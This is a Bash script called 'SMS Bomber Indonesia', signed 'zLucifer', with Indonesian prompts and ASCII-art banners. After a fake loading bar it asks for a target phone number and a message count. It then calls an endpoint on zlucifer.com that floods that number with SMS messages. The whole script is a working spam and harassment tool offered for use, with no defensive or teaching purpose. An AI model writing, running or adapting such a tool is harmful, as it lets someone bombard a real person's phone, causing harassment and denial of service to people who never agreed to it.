#!/bin/bash
#///////////////////////////////////////////////////////////////////////////////
#///////////////////////////////////////////////////////////////////////////////
#////                       _            _  __                              ////
#////                      | |          (_)/ _|                             ////
#////                   ___| |_   _  ___ _| |_ ___ _ __                     ////
#////                  |_  / | | | |/ __| |  _/ _ \ '__|                    ////
#////                   / /| | |_| | (__| | ||  __/ |                       ////
#////                  /___|_|\__,_|\___|_|_| \___|_|                       ////
#////                                                                       ////
#///////////////////////////////////////////////////////////////////////////////
#///////////////////////////////////////////////////////////////////////////////
bom(){
    sleep 0.03
    echo "      _.-^^---....,,-- "
    sleep 0.03
    echo "  _--                  --_ "
    sleep 0.03
    echo " <                        >) "
    sleep 0.03
    echo " |                         | "
    sleep 0.03
    echo "  \._                   _./ "
    sleep 0.03
    echo "     '''--. . , ; .--'''    " 
    sleep 0.03
    echo "           | |   |           "
    sleep 0.03
    echo "        .-=||  | |=-.    "
    sleep 0.03
    echo "        '-=#$%&%$#=-'    "
    sleep 0.03
    echo "           | ;  :|      "
    sleep 0.03
    echo "  _____.,-#%&$@%#&#~,._____ "
    sleep 0.03
    echo "============================="
    sleep 2
    echo "==   SMS Bomber Indonesia  =="
    sleep 0.7
    echo "============================="
}
load(){
    echo -e "\n"
    bar=" >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>> "
    barlength=${#bar}
    i=0
    while((i<100)); do
        n=$((i*barlength / 100))
        printf "\e[00;32m\r[%-${barlength}s]\e[00m" "${bar:0:n}"
        ((i += RANDOM%5+2))
        sleep 0.2
    done
}
clear
load
clear
bom
echo Selamat datang kak, Siapa nick kaka? #tulisan keluar
read nick #membaca yang ditulis
clear
load
clear
bom
echo Selamat datang $nick ":)"
get_url=$(curl -s http://zlucifer.com/api/sms.php)
cek='curl -s '$get_url # check status
response=`curl -s -o /dev/null -w "%{http_code}" $cek`
if [[ $response = *sleeping* ]]; then
    echo
    echo "Website Offline/Restart untuk sementara"
else
    echo
    echo "Silahkan masukan nomor telp target"
    echo contoh 0812345678
    read target # masukin no telp
    echo
    echo "Berapa sms yang mau dikirim?"
    read paket
    echo
    echo Apakah nomor $target "dan SMS dikirim "$paket" sudah benar?"
    echo y/n?
    read confirm
    echo
    if [ $confirm = "y" ]; then
        load
        clear
        echo Melakukan spam SMS ke nomor $target
        echo
            echo "Jangan close aplikasi sebelum spam selesai"            
            echo "========================================"
            target_do=$get_url'/sms.php?nomor='$target'&paket='$paket
            CURL_RESPONSE=`curl -s -o /dev/null -w "%{http_code}" $target_do`
            echo " Gunakan tools dengan bijak"
            echo
            echo " Love u always "
            echo " -zLucifer"
            echo "======================================="
    else
        echo "Kesalahan"
    fi
fi
